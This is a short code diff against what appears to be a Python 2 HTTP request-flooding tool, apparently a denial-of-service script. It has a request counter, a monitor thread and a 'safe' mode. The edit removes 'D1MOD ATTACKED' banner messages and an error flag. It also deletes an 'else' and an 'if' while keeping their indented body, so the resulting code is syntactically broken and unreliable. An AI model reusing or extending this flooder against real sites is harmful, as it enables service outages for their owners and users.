@@ -264,8 +264,7 @@ def httpcall(url):
 			urllib2.urlopen(request)
 	except urllib2.HTTPError, e:
 			#print e.code
-			set_flag(1)
-			print 'ATTACKED BY D1MOD'
+			
 			code=500
 	except urllib2.URLError, e:
 			#print e.reason
@@ -295,9 +294,7 @@ class MonitorThread(threading.Thread):
 			if (previous+100<request_counter) & (previous<>request_counter):
 				print "%d Requests Sent" % (request_counter)
 				previous=request_counter
-		if flag==2:
-			print "\n-- D1MOD ATTACKED Finished --"
-
+		
 #execute 
 if len(sys.argv) < 2:
 	usage()
@@ -306,9 +303,6 @@ else:
 	if sys.argv[1]=="help":
 		usage()
 		sys.exit()
-	else:
-		print "-- D1MOD ATTACKED STARTED --"
-		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
 		url = sys.argv[1]
